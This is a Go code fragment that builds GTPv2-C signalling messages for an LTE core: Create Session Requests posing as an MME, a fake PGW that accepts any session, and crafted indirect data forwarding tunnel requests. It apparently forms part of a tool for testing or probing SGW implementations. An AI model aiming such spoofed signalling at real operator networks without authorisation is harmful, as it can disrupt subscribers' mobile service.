func buildCSR(seq uint32, headerTEID uint32, imsi string, mmeTEID uint32, localIP, pgwIP, apn string, baseEBI int, numBearers int) *message.CreateSessionRequest {
	senderFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS11MMEGTPC, mmeTEID, localIP, "")
	pgwFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, 0, pgwIP, "").WithInstance(1)

	bearerIEs := make([]*ie.IE, 0, numBearers)
	for b := 0; b < numBearers; b++ {
		ebi := uint8(baseEBI + b)
		enbTEID := mmeTEID*10 + uint32(b)

		bearerCtx := ie.NewBearerContext(
			ie.NewEPSBearerID(ebi),
			ie.NewFullyQualifiedTEID(gtpv2.IFTypeS1UeNodeBGTPU, enbTEID, localIP, ""),
			ie.NewBearerQoS(1, 2, 1, 9, defaultBearerQoSGBR, defaultBearerQoSGBR, defaultBearerQoSGBR, defaultBearerQoSGBR),
		)
		bearerIEs = append(bearerIEs, bearerCtx)
	}

	ies := []*ie.IE{
		ie.NewIMSI(imsi),
		ie.NewMSISDN("8612345678901"),
		ie.NewMobileEquipmentIdentity("353490069876543"),
		ie.NewServingNetwork("001", "01"),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewIndicationFromOctets(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
		senderFTEID,
		pgwFTEID,
		ie.NewAccessPointName(apn),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewPDNAddressAllocation("0.0.0.0"),
		ie.NewAggregateMaximumBitRate(100000000, 50000000),
	}

	ies = append(ies, bearerIEs...)
	return message.NewCreateSessionRequest(headerTEID, seq, ies...)
}

func buildIDFTR(seq uint32, sgwS11TEID uint32, ebis []uint8, localIP string, includeS12 bool) *message.Generic {
	ies := make([]*ie.IE, 0, len(ebis))
	baseTEID := atomic.AddUint32(&fakePGWS5UTEID, 1)

	for i, ebi := range ebis {
		s1uTEID := baseTEID + uint32(i*2)
		s1u := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS1UeNodeBGTPU, s1uTEID, localIP, "")

		bearerIEs := []*ie.IE{
			ie.NewEPSBearerID(ebi),
			s1u,
		}

		if includeS12 {
			s12TEID := s1uTEID + 1
			s12 := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS12RNCGTPU, s12TEID, localIP, "").WithInstance(4)
			bearerIEs = append(bearerIEs, s12)
		}

		ies = append(ies, ie.NewBearerContext(bearerIEs...))
	}

	return message.NewGeneric(message.MsgTypeCreateIndirectDataForwardingTunnelRequest, sgwS11TEID, seq, ies...)
}

func waitForCreateSessionResponse(conn net.Conn, timeout time.Duration, expectedTEID uint32) (*message.CreateSessionResponse, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 4096)

	for {
		if err := conn.SetReadDeadline(deadline); err != nil {
			return nil, err
		}

		n, err := conn.Read(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				return nil, err
			}
			return nil, err
		}

		hdr, err := message.ParseHeader(buf[:n])
		if err != nil {
			continue
		}
		if hdr.Type != message.MsgTypeCreateSessionResponse {
			continue
		}
		if expectedTEID != 0 && hdr.TEID != expectedTEID {
			continue
		}

		rsp, err := message.ParseCreateSessionResponse(buf[:n])
		if err != nil {
			continue
		}
		return rsp, nil
	}
}

func extractSGWS11TEID(rsp *message.CreateSessionResponse) (uint32, error) {
	if rsp == nil || rsp.SenderFTEIDC == nil {
		return 0, errors.New("missing Sender F-TEID")
	}

	fteid, err := rsp.SenderFTEIDC.FullyQualifiedTEID()
	if err != nil {
		return 0, err
	}
	if fteid.TEIDGREKey == 0 {
		return 0, errors.New("SGW S11 TEID is zero")
	}

	return fteid.TEIDGREKey, nil
}

func startFakePGW(bindAddr, pgwIP, paa string) (*net.UDPConn, error) {
	addr, err := net.ResolveUDPAddr("udp", bindAddr)
	if err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, err
	}
	go runFakePGW(conn, pgwIP, paa)
	return conn, nil
}

func runFakePGW(conn *net.UDPConn, pgwIP, paa string) {
	buf := make([]byte, 4096)
	for {
		n, addr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			if errors.Is(err, net.ErrClosed) {
				return
			}
			log.Printf("[!] Fake PGW read error: %v", err)
			continue
		}

		hdr, err := message.ParseHeader(buf[:n])
		if err != nil {
			continue
		}
		if hdr.Type != message.MsgTypeCreateSessionRequest {
			continue
		}

		req, err := message.ParseCreateSessionRequest(buf[:n])
		if err != nil {
			log.Printf("[!] Fake PGW: failed to parse CreateSessionRequest: %v", err)
			continue
		}

		sgwS5CTEID, err := extractFTEID(req.SenderFTEIDC)
		if err != nil {
			log.Printf("[!] Fake PGW: missing SGW S5-C TEID: %v", err)
			continue
		}

		ebis := extractBearerEBIs(req)
		if len(ebis) == 0 {
			ebis = []uint8{minEBI}
		}

		rsp := buildFakeCreateSessionResponse(hdr.SequenceNumber, sgwS5CTEID, pgwIP, paa, ebis)
		payload, err := rsp.Marshal()
		if err != nil {
			log.Printf("[!] Fake PGW: failed to marshal CreateSessionResponse: %v", err)
			continue
		}

		if _, err := conn.WriteToUDP(payload, addr); err != nil {
			log.Printf("[!] Fake PGW send error: %v", err)
		}
	}
}

func extractFTEID(fteidIE *ie.IE) (uint32, error) {
	if fteidIE == nil {
		return 0, errors.New("missing F-TEID")
	}
	fteid, err := fteidIE.FullyQualifiedTEID()
	if err != nil {
		return 0, err
	}
	if fteid.TEIDGREKey == 0 {
		return 0, errors.New("F-TEID TEID is zero")
	}
	return fteid.TEIDGREKey, nil
}

func extractBearerEBIs(req *message.CreateSessionRequest) []uint8 {
	ebis := make([]uint8, 0, len(req.BearerContextsToBeCreated))
	for _, bc := range req.BearerContextsToBeCreated {
		if bc == nil {
			continue
		}
		ebi, err := bc.EPSBearerID()
		if err != nil {
			continue
		}
		ebis = append(ebis, ebi)
	}
	if len(ebis) == 0 && req.LinkedEBI != nil {
		if ebi, err := req.LinkedEBI.EPSBearerID(); err == nil {
			ebis = append(ebis, ebi)
		}
	}
	return ebis
}

func buildFakeCreateSessionResponse(seq uint32, sgwS5CTEID uint32, pgwIP, paa string, ebis []uint8) *message.CreateSessionResponse {
	pgwS5CTEID := atomic.AddUint32(&fakePGWS5CTEID, 1)
	cause := ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil)
	senderFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwS5CTEID, pgwIP, "")
	pgwFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwS5CTEID, pgwIP, "").WithInstance(1)
	paaIE := ie.NewPDNAddressAllocation(paa)

	ies := []*ie.IE{cause, senderFTEID, pgwFTEID, paaIE}

	for _, ebi := range ebis {
		pgwS5UTEID := atomic.AddUint32(&fakePGWS5UTEID, 1)
		s5uFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPU, pgwS5UTEID, pgwIP, "").WithInstance(2)
		bc := ie.NewBearerContext(
			ie.NewEPSBearerID(ebi),
			ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
			s5uFTEID,
		)
		ies = append(ies, bc)
	}

	return message.NewCreateSessionResponse(sgwS5CTEID, seq, ies...)
}
